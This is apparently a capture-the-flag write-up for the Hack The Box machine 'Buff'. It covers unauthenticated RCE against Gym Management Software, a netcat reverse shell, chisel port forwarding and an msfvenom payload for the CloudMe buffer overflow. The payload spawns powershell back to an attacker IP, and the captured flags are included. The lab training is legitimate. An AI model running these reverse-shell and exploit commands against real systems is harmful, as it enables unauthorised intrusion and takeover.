# Buff

export IP=10.10.10.198

## Solution

I'll start with an nmap scan to verify if anything interesting pops-up <br>

cmd: nmap -sC -sV -Pn -oN nmap/initial $IP

```
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut

```

CMS: Gym Management Software 1.0 <br>

lets run a gobuster just to check if we can find something <br>

using searchsploit there is an entry to the actual version found in the page to perform a RCE unathed!!! <br>

Executing the exploit give us a shell in the server under the user: <b> buff\shaun </b> <br>

the shell is horrible, lets upgrade it by modifying the exploit to create a backdoor by listening on port 9191<br>

Since the machine does not have nc, lets get it... src: https://eternallybored.org/misc/netcat/ <br>

Now need to upload it to the machine... cmd: curl -O MY_IP:8000/nc.exe <br>

Spawn a reverse shell (already listening locally)... cmd: nc.exe MY_IP 9191 -e cmd.exe <br>

From what i could enumerate manually, the root account for mysql does not have any password !!! but i cannot launch it right away lets find it <br>

The mysql.exe is in "c:\xampp\mysql\bin" but it got stuck... <br>

By diving to the users desktop, there is a user.txt which is the flag <br>

```
cd c:\users\shaun\desktop
type user.txt

FLAG: e0095ae79b5cf39aaf79eeff9ce2f33a
```

One thing that i found (manually) laying around (Downloads) was an executable CloudMe_1112.exe dont know what this is but it was running... <br>

Now we need to find vectors for privesc to Administrator... but linpeas won't work here (since it is for linux systems DUH!) <br>

From its creator, there is a WINPEAS executable to privesc! awesome !! <br>

From winPEAS we can see that the machine is listening on port 3306 (mysql) and 8888 (dont know what) <br>

After some research (src: https://www.speedguide.net/port.php?port=8888) found that it is related to the CloudMe file that i've found before with the following statement:

```
An issue was discovered in CloudMe 1.11.0. An unauthenticated local attacker that can connect to the "CloudMe Sync" client application listening on 127.0.0.1 port 8888 can send a malicious payload causing a buffer overflow condition. This will result in code execution, as demonstrated by a TCP reverse shell, or a crash
```

Lets search it !! <br>

cmd: searchsploit cloudme

```
CloudMe 1.11.2 - Buffer Overflow (PoC)
```

One thing that will make it harder is the fact that the port 8888 is listening in 127.0.0.1 which does not contact with the outside <br>

Since the exploit is expected to run locally, we need to connect to the victim but need to forward the port to the port 8888. <br>

For this, i found a very interesting resource regarding multiple aspects of ethical hacking... <br>

src: https://oscp.infosecsanyam.in/ (the pivoting section)<br> 

I found that chisel had a cleaner and easier syntax so i went with chisel to do the pivoting on the ports.. <br>

Started chisel in server mode in my machine 

```
LOCAL: ./chisel server -p 8000 -reverse
REMOTE: .\chisel client 10.10.14.242:8000 R:8888:127.0.0.1:8888
```

Next i needed to generate the payload to be injected in the CloudMe app and did it as suggested in the exploit and started the nc on port 1414 (where i'll receive the reverse shell)

```
msfvenom -p windows/exec CMD="c:\users\shaun\tmp\nc.exe -e powershell.exe 10.10.14.242 1414" -b "\x00\x0a\x0d" -f py -v payload 

nc -lvvnp 1414
```

After that, and since chisel will redirect on the remote to the port 8888, i can execute the exploit  locally <br>

```
whoami
buff\administrator

cat c:\users\administrator\desktop\root.txt
FLAG: e07075765189a03636cf177fdbb80a0b
```





